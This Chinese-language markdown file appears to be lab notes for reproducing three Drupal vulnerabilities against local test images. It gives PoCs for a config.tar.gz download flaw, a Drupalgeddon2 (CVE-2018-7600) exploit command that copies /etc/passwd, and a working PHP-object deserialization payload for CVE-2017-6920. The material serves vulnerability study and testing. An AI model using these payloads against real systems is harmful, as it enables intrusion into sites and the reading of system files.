## config.tar.gz 下载漏洞

测试镜像

* src/drupal/8.1.9/

参考链接

* [Drupal 8 配置文件下载漏洞分析](http://blog.knownsec.com/2016/09/drupal-8-config-download/)

Poc

```
# 后台导出配置后，执行这个
wget 'http://127.0.0.1/system/temporary/?file=config.tar.gz' -O config.tar.gz
```

## CVE-2018-7600 - post_render/call_user_func 命令执行漏洞

测试镜像

* src/drupal/8.3.3/

参考链接

* [dreadlocked/Drupalgeddon2 - Exploit for Drupalgeddon 2 - CVE-2018-7600](https://github.com/dreadlocked/Drupalgeddon2)
* [Uncovering drupalgeddon](https://research.checkpoint.com/uncovering-drupalgeddon-2/)
* [Drupal core - Highly critical - Remote Code Execution - SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)

Poc

```
python2.7 CVE-2018-7600.py http://127.0.0.1/ 'cp /etc/passwd /tmp'
```

## yaml.decode_php 反序列化漏洞

测试镜像

* src/drupal/8.3.3/

参考链接

* [CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造](https://paper.seebug.org/334/)

影响版本

* <= 8.3.3

Poc

```
打开 /admin/config/development/configuration/single/import

导入 Single configuration

!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
```




